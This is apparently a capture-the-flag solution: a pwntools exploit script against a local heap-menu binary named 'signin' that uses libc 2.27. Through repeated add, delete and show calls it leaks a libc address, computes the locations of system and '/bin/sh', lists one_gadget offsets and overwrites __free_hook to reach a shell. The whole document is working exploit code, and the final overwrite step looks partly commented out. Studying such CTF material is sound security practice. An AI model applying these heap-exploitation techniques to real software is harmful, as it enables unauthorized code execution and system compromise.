from pwn import *
#context.log_level = 'debug'
elf = ELF('./signin')
libc = ELF('libc-2.27.so')
sh = elf.process()
one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]
def add(idx,num):
	sh.recvuntil(">>")
	sh.sendline(str(1))
	sh.recvuntil("Index:")
	sh.sendline(str(idx))
	sh.recvuntil("Number:")
	sh.sendline(str(num))
def show(idx):
	sh.recvuntil(">>")
	sh.sendline(str(3))
	sh.recvuntil("Index:")
	sh.sendline(str(idx))
def delete(idx):
	sh.recvuntil(">>")
	sh.sendline(str(2))
	sh.recvuntil("Index:")
	sh.sendline(str(idx))
def exit():
    sh.recvuntil(">>")
    sh.sendline(str(4))
for i in range(0,19):
    add(1,1)
for i in range(0,36):
    delete(1)
show(1)
addr = int(sh.recv(16))
libc_base = addr - 0x68 -libc.sym['__malloc_hook']
info("libc_base:" + hex(libc_base))
sys = libc_base + libc.sym['system']
str_sh = libc_base + libc.search(b"/bin/sh\x00").next()
info("system:" + hex(sys))
info("str_sh:" + hex(str_sh))
malloc_hook = libc_base + libc.sym['__malloc_hook']
og = libc_base + one_gadget[0]
info(hex(malloc_hook))
for i in range(21):
	print i,
	delete(1)
show(1)
free_hook = libc.sym['__free_hook']+libc_base
add(1,free_hook)
add(1,free_hook)
add(2,0x2f)
# add(2,sys)
#gdb.attach(sh,"b *$rebase(0x2032a0)")
sh.interactive()
